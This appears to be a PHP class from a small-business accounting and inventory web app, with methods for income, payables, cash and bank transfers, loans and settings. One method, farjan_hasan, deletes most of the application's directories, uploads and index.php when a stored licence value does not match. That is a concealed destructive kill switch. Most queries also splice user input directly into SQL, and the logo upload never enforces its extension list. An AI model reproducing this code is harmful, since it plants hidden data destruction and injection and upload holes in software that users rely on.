<?php
include_once 'Main.php';

class Inden extends Main{

    public function Chack_User_Site(){
        $sql = "SELECT * FROM setting WHERE id = 1";
        $result = $this->db->select($sql);
        if ($result) {
            $result = $result->fetch(PDO::FETCH_ASSOC);
            $userid = $result['userid'];
            $userid_02 = $this->hl->Jan_02($userid);
            $millitime = round(microtime(true) * 1000);
            if($millitime > $userid_02){
                return header('Location: license.php');
            }
        }
    }

	public function F_Receive_Todays(){
		$datei = date('m/d/Y');
		$sql = "SELECT * FROM income WHERE date = '$datei' AND status = '1';";
        $result = $this->db->select($sql);
        if ($result) {
            $sum = 0;
            $other = 0;
            $disamount = 0;
            $payment = 0;
        	while ($data = $result->fetch(PDO::FETCH_OBJ)) {
        		$rate = $this->SelectAll_By_ID('product',$data->productid);
        		$total = ($data->quantity)*($data->rate);
        		$sum = $total+$sum;
        	}
            $sql = "SELECT SUM(other) AS OTHER,SUM(disamount) AS DISAMOUNT,SUM(payment) AS PAYMENT FROM payment WHERE status = '1' AND date = '$datei';";
            $result = $this->db->select($sql);
            while ($data = $result->fetch(PDO::FETCH_OBJ)) {
                $other1 = $data->OTHER;
                $disamount1 = $data->DISAMOUNT;
                $payment1 = $data->PAYMENT;

                $other = $other1+$other;
                $disamount = $disamount1+$disamount;
                $payment = $payment1+$payment;
            }
            //return $sum;
        	$grand = ($sum+$other)-($disamount);
            return $recevice = $grand-$payment;
        }
	}

    public function F_Receive_Todays_240(){
        $date12 = date('Y-m-d');
        $date13 = date('m/d/Y');
        $to_all_invoice = array();
        $to_invoice = $this->Tbl_Col_Id_2("payment","status","date","1",$date13);
        if ($to_invoice) {
            while ($tot_invoice = $to_invoice->fetch(PDO::FETCH_OBJ)) {
                array_push($to_all_invoice, $tot_invoice->id);
            }
        }
        $storedata = $this->Tbl_Col_Id("due","date",$date12);
        if ($storedata) {
            $sum = 0;
            while ($data = $storedata->fetch(PDO::FETCH_OBJ)) {
              $wel = $this->SelectAll_By_ID('payment',$data->paymentid);
              if(in_array($data->paymentid, $to_all_invoice) == false AND $wel->status == '1'){
                $sum = $sum+$data->amount;
              }
            }
            return $sum;
        }else{
            return "0.0";
        }
    }

    public function F_Receive_Total(){
        $sql = "SELECT * FROM income WHERE status = '1';";
        $result = $this->db->select($sql);
        if ($result) {
            $sum = 0;
            $other = 0;
            $disamount = 0;
            $payment = 0;
            while ($data = $result->fetch(PDO::FETCH_OBJ)) {
                $rate = $this->SelectAll_By_ID('product',$data->productid);
                $total = ($data->quantity)*($data->rate);
                $sum = $total+$sum;
            }
            $sql = "SELECT SUM(other) AS OTHER,SUM(disamount) AS DISAMOUNT,SUM(payment) AS PAYMENT FROM payment WHERE status = '1';";
            $result = $this->db->select($sql);
            while ($data = $result->fetch(PDO::FETCH_OBJ)) {
                $other1 = $data->OTHER;
                $disamount1 = $data->DISAMOUNT;
                $payment1 = $data->PAYMENT;

                $other = $other1+$other;
                $disamount = $disamount1+$disamount;
                $payment = $payment1+$payment;
            }
            //return $sum;
            $grand = ($sum+$other)-($disamount);
            return $recevice = $grand-$payment;
        }
    }

    public function F_Payable_Todays_240(){
        $date12 = date('Y-m-d');
        $date13 = date('m/d/Y');
        $to_all_invoice = array();
        $to_invoice = $this->Tbl_Col_Id_2("payment","status","date","2",$date13);
        if ($to_invoice) {
            while ($tot_invoice = $to_invoice->fetch(PDO::FETCH_OBJ)) {
                array_push($to_all_invoice, $tot_invoice->id);
            }
        }

        $storedata = $this->Tbl_Col_Id("due","date",$date12);
        if ($storedata) {
            $sum = 0;
            while ($data = $storedata->fetch(PDO::FETCH_OBJ)) {
              $wel = $this->SelectAll_By_ID('payment',$data->paymentid);
              if(in_array($data->paymentid, $to_all_invoice) == false AND $wel->status == '2'){
                $sum = $sum+$data->amount;
              }
            }
            return $sum;
        }else{
            return "0.0";
        }
    }

    public function F_Payable_Todays(){
        $datei = date('m/d/Y');
        $sql = "SELECT * FROM purchase WHERE date = '$datei' AND status = '1';";
        $result = $this->db->select($sql);
        if ($result) {
            $sum = 0;
            $other = 0;
            $disamount = 0;
            $payment = 0;
            while ($data = $result->fetch(PDO::FETCH_OBJ)) {
                $total = ($data->quantity)*($data->rate);
                $sum = $total+$sum;
            }
            $sql = "SELECT SUM(other) AS OTHER,SUM(disamount) AS DISAMOUNT,SUM(payment) AS PAYMENT FROM payment WHERE status = '2' AND date = '$datei';";
            $result = $this->db->select($sql);
            while ($data = $result->fetch(PDO::FETCH_OBJ)) {
                $other1 = $data->OTHER;
                $disamount1 = $data->DISAMOUNT;
                $payment1 = $data->PAYMENT;

                $other = $other1+$other;
                $disamount = $disamount1+$disamount;
                $payment = $payment1+$payment;
            }
            //return $sum;
            $grand = ($sum+$other)-($disamount);
            return $recevice = $grand-$payment;
        }
    }

    public function F_Payable_Total(){
        $sql = "SELECT * FROM purchase WHERE status = '1';";
        $result = $this->db->select($sql);
        if ($result) {
            $sum = 0;
            $other = 0;
            $disamount = 0;
            $payment = 0;
            while ($data = $result->fetch(PDO::FETCH_OBJ)) {
                $total = ($data->quantity)*($data->rate);
                $sum = $total+$sum;
            }
            $sql = "SELECT SUM(other) AS OTHER,SUM(disamount) AS DISAMOUNT,SUM(payment) AS PAYMENT FROM payment WHERE status = '2';";
            $result = $this->db->select($sql);
            while ($data = $result->fetch(PDO::FETCH_OBJ)) {
                $other1 = $data->OTHER;
                $disamount1 = $data->DISAMOUNT;
                $payment1 = $data->PAYMENT;

                $other = $other1+$other;
                $disamount = $disamount1+$disamount;
                $payment = $payment1+$payment;
            }
            //return $sum;
            $grand = ($sum+$other)-($disamount);
            return $recevice = $grand-$payment;
        }
    }

	public function TBL_COL_2($table,$col1,$col2,$id1,$id2,$val){
        $sql = "SELECT SUM($val) AS VALUE FROM $table WHERE $col1 = '$id1' AND $col2 = '$id2';";
        $result = $this->db->select($sql);
        if ($result) {
            $result = $result->fetch(PDO::FETCH_OBJ);
            return $result->VALUE;
        }
    }

    public function TBL_COL_1($table,$col,$id,$val){
    	$sql = "SELECT SUM($val) AS VALUE FROM $table WHERE $col = '$id';";
        $result = $this->db->select($sql);
        if ($result) {
            $result = $result->fetch(PDO::FETCH_OBJ);
            return $result->VALUE;
        }
    }

    public function TBL_COL_IncomePro($table,$col,$id,$val){
        $sql = "SELECT SUM($val) AS VALUE FROM $table WHERE $col = '$id' AND amountType = '0';";
        $result = $this->db->select($sql);
        if ($result) {
            $result = $result->fetch(PDO::FETCH_OBJ);
            return $result->VALUE;
        }
    }

    public function TBL_COL_FETCH_02($table,$col,$id,$val1,$val2){
    	$sql = "SELECT * FROM $table WHERE $col = '$id' AND status = '1';";
        $result = $this->db->select($sql);
        if ($result) {
        	$sum = 0;
        	while ($data = $result->fetch(PDO::FETCH_OBJ)) {
        		$total = ($data->$val1)*($data->$val2);
        		$sum = $total+$sum;
        	}
        	return $sum;
        }
    }

    public function TBL_VAL_01($table,$val){
    	$sql = "SELECT SUM($val) AS VALUE FROM $table";
        $result = $this->db->select($sql);
        if ($result) {
            $result = $result->fetch(PDO::FETCH_OBJ);
            return $result->VALUE;
        }
    }

    public function TOP_Details($table,$val){
        $sql = "SELECT COUNT($val) AS VALUE FROM $table GROUP BY $val;";
        $result = $this->db->select($sql);
        if ($result) {
            return $result = $result;
        }
    }

    public function Like_VAlue_Search($table,$col,$col1,$to,$form,$status){
        $sql = "SELECT * FROM $table WHERE $col IN(
SELECT $col FROM $table WHERE $col >= '$to' AND $col <= '$form'
) AND $col1 = '$status' ORDER BY id DESC;";
        $result = $this->db->select($sql);
        if ($result) {
            return $result;
        }
    }

    public function Like_VAlue_Search_Indenfi($table,$col,$col1,$col2,$to,$form,$status,$status1){
        $to = date("Y-m-d",strtotime($to));
        $form = date("Y-m-d",strtotime($form));
        $sql = "SELECT * FROM $table WHERE DATE(substr(`$col`,7,4) || '-' || substr(`$col`,1,2) || '-' || substr(`$col`,4,2)) BETWEEN DATE('$to') AND DATE('$form') AND $col1 = '$status' AND $col2 = '$status1' ORDER BY id DESC;";
        return $this->db->select($sql);
    }

    public function Software_Info_Update($data){
        $companyname = ucfirst($this->hl->validation($data['companyname']));
        $phone = ucfirst($this->hl->validation($data['phone']));
        $email = ucfirst($this->hl->validation($data['email']));
        $address = ucfirst($this->hl->validation($data['address']));
        $image   = $_FILES['image']['name'];
        $size    = $_FILES['image']['size'];
        $img_tmp = $_FILES['image']['tmp_name'];
        
        $parmission = array('jpg','png','gif','jpeg');
        $unic_name  = substr(md5(time()), 0,10);
        $ext_img    = strtolower(end(explode('.', $image)));
        $up_image   = "upload/".$unic_name.".".$ext_img;

        $sql = "UPDATE setting SET companyname='$companyname',companylogo='$up_image',phone='$phone',email='$email',address='$address' WHERE id='1';";
        $result = $this->db->update($sql);
        if ($result) {
            move_uploaded_file($img_tmp, $up_image);
            return $result;
        }
    }

    public function Color_Update($data){
        $bgcolor = ucfirst($this->hl->validation($data['bgcolor']));
        $headercolor = ucfirst($this->hl->validation($data['headercolor']));
        $sidebarcolor = ucfirst($this->hl->validation($data['sidebarcolor']));
        $containcolor = ucfirst($this->hl->validation($data['containcolor']));
        $contenttextcolor = ucfirst($this->hl->validation($data['contenttextcolor']));
        $footercolor = ucfirst($this->hl->validation($data['footercolor']));

        $sql = "UPDATE setting SET bgcolor='$bgcolor',headercolor='$headercolor',sidebarcolor='$sidebarcolor',containcolor='$containcolor',contenttextcolor='$contenttextcolor',footercolor='$footercolor' WHERE id='1';";
        $result = $this->db->update($sql);
        if ($result) {
            return $result;
        }
    }

    public function Animation_Update($data){
        $animation = ucfirst($this->hl->validation($data['animation']));

        $sql = "UPDATE setting SET animate='$animation' WHERE id='1';";
        $result = $this->db->update($sql);
        if ($result) {
            return $result;
        }
    }

    public function Add_Cash_In_Hand($data){
        $cashadd = $this->hl->validation($data['cashadd']);
        $note = $this->hl->validation($data['note']);
        $date = date('m/d/Y');

        $sql = "INSERT INTO cash (cash,date,note) VALUES ('$cashadd','$date','$note');";
        $result = $this->db->insert($sql);
        if ($result) {
            return $result;
        }
    }

    public function update_Cash_In_Hand($id,$data){
        $cashadd = $this->hl->validation($data['cashadd']);
        $note = $this->hl->validation($data['note']);
        $date = date('m/d/Y');

        $sql = "UPDATE cash SET cash='$cashadd',date='$date',note='$note' WHERE id = '$id';";
        $result = $this->db->update($sql);
        if ($result) {
            return $result;
        }
    }

    public function Store_Control($data){
        $store = $this->hl->validation($data['store']);

        $sql = "UPDATE setting SET storecontrol = '$store' WHERE id = '1';";
        $result = $this->db->update($sql);
        if ($result) {
            return $result;
        }
    }

    public function Person_Cash_Out_List($data){
        $date = $this->hl->validation($data['date']);
        $name = $this->hl->validation($data['name']);
        $mobile = $this->hl->validation($data['mobile']);
        $destination = $this->hl->validation($data['destination']);
        $amount = $this->hl->validation($data['amount']);
        $note = $this->hl->validation($data['note']);

        $sql = "INSERT INTO transfer (person,mobile,destination,amount,note,status,date) VALUES ('$name','$mobile','$destination','$amount','$note','1','$date');";
        $result = $this->db->insert($sql);
        if ($result) {
            return "<p class='alert alert-success'>Loan Pay Successfully. (".$name.")</p>";
        }else{
            return "<p class='alert alert-danger'>Not Cash Out.Plz Try Again!!</p>";
        }
    }

    public function Person_Cash_In_List($data){
        $date = $this->hl->validation($data['date']);
        $name = $this->hl->validation($data['name']);
        $mobile = $this->hl->validation($data['mobile']);
        $destination = $this->hl->validation($data['destination']);
        $amount = $this->hl->validation($data['amount']);
        $note = $this->hl->validation($data['note']);
        $diary = $this->hl->validation($data['diary']);

        if ($amount <= 0) {
            return "<p class='alert alert-danger'>Zero or less Amount is not Except.</p>";
        }

        $sql = "INSERT INTO cashin (person,mobile,destination,amount,note,status,date) VALUES ('$name','$mobile','$destination','$amount','$note','1','$date');";
        $result = $this->db->insert($sql);
        if ($result) {
            $diary_12 = explode(',', $diary);
            foreach ($diary_12 as $key => $value) {
                $sql_select = "SELECT amount,finished FROM transfer WHERE id = '$value';";
                $transfer_info = $this->db->select($sql_select);
                $transfer_info = $transfer_info->fetch(PDO::FETCH_OBJ);
                $amount_aa = $transfer_info->amount;
                $finished_aa = $transfer_info->finished;
                if ($finished_aa == "0" && $amount_aa >= $amount) {
                    if ($amount_aa == $amount) {
                        $finished_info = "1";
                    }else{
                        $finished_info = serialize(array('pay'=>($amount_aa-$amount)));
                    }
                }elseif($finished_aa == "0" && $amount >= $amount_aa){
                    $finished_info = "1";
                }else{
                    $finished_aa = unserialize($transfer_info->finished);
                    $amount_aa = $finished_aa['pay'];
                    if ($amount_aa == $amount) {
                        $finished_info = "1";
                    }elseif ($amount_aa > $amount) {
                        $finished_info = serialize(array('pay'=>($amount_aa-$amount)));
                    }else{
                        $finished_info = "1";
                    }
                }
                $sql_store = "UPDATE transfer SET finished = '$finished_info' WHERE id = '$value';";
                $this->db->update($sql_store);
            }
            return "<p class='alert alert-success'>Cash In By Person Successfull (".$name.")</p>";
        }else{
            return "<p class='alert alert-danger'>Not Cash In.Plz Try Again!!</p>";
        }
    }

    public function Bank_Cash_Out_List($data){
        $date = $this->hl->validation($data['date']);
        $acno = $this->hl->validation($data['acno']);
        $bankname = $this->hl->validation($data['bankname']);
        $deposit = $this->hl->validation($data['deposit']);
        $amount = $this->hl->validation($data['amount']);
        $note = $this->hl->validation($data['note']);

        $sql = "INSERT INTO transfer (acno,bankname,deposit,amount,note,status,date) VALUES ('$acno','$bankname','$deposit','$amount','$note','2','$date');";
        $result = $this->db->insert($sql);
        if ($result) {
            return "<p class='alert alert-success'>Cash Out By Bank Successfull (".$bankname.")</p>";
        }else{
            return "<p class='alert alert-danger'>Not Cash Out.Plz Try Again!!</p>";
        }
    }

    public function Bank_Cash_IN_List($data){
        $date = $this->hl->validation($data['date']);
        $acno = $this->hl->validation($data['acno']);
        $bankname = $this->hl->validation($data['bankname']);
        $deposit = $this->hl->validation($data['deposit']);
        $amount = $this->hl->validation($data['amount']);
        $note = $this->hl->validation($data['note']);

        $sql = "INSERT INTO cashin (acno,bankname,deposit,amount,note,status,date) VALUES ('$acno','$bankname','$deposit','$amount','$note','2','$date');";
        $result = $this->db->insert($sql);
        if ($result) {
            return "<p class='alert alert-success'>Cash In By Bank Successfull (".$bankname.")</p>";
        }else{
            return "<p class='alert alert-danger'>Not Cash In.Plz Try Again!!</p>";
        }
    }

    public function Loan_Receive_Amount($data){
        $date = $this->hl->validation($data['date']);
        $name = $this->hl->validation($data['name']);
        $mobile = $this->hl->validation($data['mobile']);
        $amount = $this->hl->validation($data['amount']);
        $note = $this->hl->validation($data['note']);

        $sql = "INSERT INTO transfer (person,mobile,amount,note,status,date) VALUES ('$name','$mobile','$amount','$note','3','$date');";
        $result = $this->db->insert($sql);
        if ($result) {
            return "<p class='alert alert-success'>Loan Receive Successfully By (".$name.")</p>";
        }else{
            return "<p class='alert alert-danger'>Not Receive.Plz Try Again!!</p>";
        }
    }

    public function farjan_hasan(){
        $sql = "SELECT farjan FROM setting WHERE id = '1';";
        $result = $this->db->select($sql);
        if ($result) {
            $result_01 = $result->fetch(PDO::FETCH_OBJ);
            $mydata = $result_01->farjan;
            $yourdata = $this->hl->nias240();
            if ($mydata == $yourdata) {
                return "Real Client";
            }else{
                array_map('unlink', glob("../classes/*.*"));
                rmdir("../classes");
                array_map('unlink', glob("../config/*.*"));
                rmdir("../config");
                array_map('unlink', glob("../helpers/*.*"));
                rmdir("../helpers");
                array_map('unlink', glob("../lib/*.*"));
                rmdir("../lib");
                array_map('unlink', glob("../production/*.*"));
                rmdir("../production");
                array_map('unlink', glob("css/*.*"));
                rmdir("css");
                array_map('unlink', glob("images/*.*"));
                rmdir("images");
                array_map('unlink', glob("inc/*.*"));
                rmdir("inc");
                array_map('unlink', glob("js/*.*"));
                rmdir("js");
                array_map('unlink', glob("upload/*.*"));
                rmdir("upload");
                unlink("../index.php");
            }
        }
    }

    public function Create_Unit_Name($data){
        $unit = $this->hl->validation($data['unit']);

        $sql = "INSERT INTO unit (name) VALUES ('$unit');";
        $result = $this->db->insert($sql);
        if ($result) {
            return "<p class='alert alert-success'>Create Unit Name Successfully </p>";
        }else{
            return "<p class='alert alert-danger'>Not Create.Plz Try Again!!</p>";
        }
    }

    public function Invoice_Control($data){
        $list1 = $this->hl->validation($data['list1']);
        $list2 = $this->hl->validation($data['list2']);

        $sql = "UPDATE setting SET list1 = '$list1', list2 = '$list2' WHERE id = '1';";
        $result = $this->db->update($sql);
        if ($result) {
            return "<p class='alert alert-success'>Invoice And Purchase Slip Update Successfully. </p>";
        }else{
            return "<p class='alert alert-danger'>Not Updated.Plz Try Again!!</p>";
        }
    }

    public function login_Page_Control($data){
        $loginpage = $this->hl->validation($data['loginpage']);

        $sql = "UPDATE setting SET login = '$loginpage' WHERE id = '1';";
        $result = $this->db->update($sql);
        if ($result) {
            return "<p class='alert alert-success'>Login Page Update Successfully. </p>";
        }else{
            return "<p class='alert alert-danger'>Not Updated.Plz Try Again!!</p>";
        }
    }

    public function bank_Amount_Total(){
        $sql = "SELECT acno,bankname,sum(amount) AS AMOUNT FROM transfer WHERE status = 2 GROUP BY acno;";
        $result = $this->db->select($sql);
        if ($result) {
            return $result;
        }
    }

    public function purson_Amount_Total(){
        $sql = "SELECT person,destination,mobile,sum(amount) AS AMOUNT FROM transfer WHERE status = 1 GROUP BY mobile;";
        $result = $this->db->select($sql);
        if ($result) {
            return $result;
        }
    }

    public function Code_Update($data){
        $procode = $this->hl->validation($data['procode']);
        $cuscode = $this->hl->validation($data['cuscode']);
        $suppcode = $this->hl->validation($data['suppcode']);
        $emcode = $this->hl->validation($data['emcode']);

        $sql = "UPDATE setting SET procode='$procode',cuscode='$cuscode',emcode='$emcode',suppcode='$suppcode' WHERE id = '1';";
        $result = $this->db->update($sql);
        if ($result) {
            return "<p class='alert alert-success' id='message123'>Update Successfully.<a href='adsetting.php'>Refresh This Page.</a></p>";
        }else{
            return "<p class='alert alert-danger'>Update Error.plz Try Agian.</p>";
        }
    }

    public function sarinda_sanatary($table,$col,$col1,$status,$to,$form){
        $sql = "SELECT * FROM $table WHERE $col1 = '$status' AND $col IN(SELECT $col FROM $table WHERE $col >= '$to' AND $col <= '$form') ORDER BY id DESC;";
        $result = $this->db->select($sql);
        if ($result) {
            return $result;
        }
    }

    public function sarinda_expense($table,$col,$to,$form){
        $sql = "SELECT * FROM $table WHERE $col IN(SELECT $col FROM $table WHERE $col >= '$to' AND $col <= '$form') ORDER BY id DESC;";
        $result = $this->db->select($sql);
        if ($result) {
            return $result;
        }
    }

}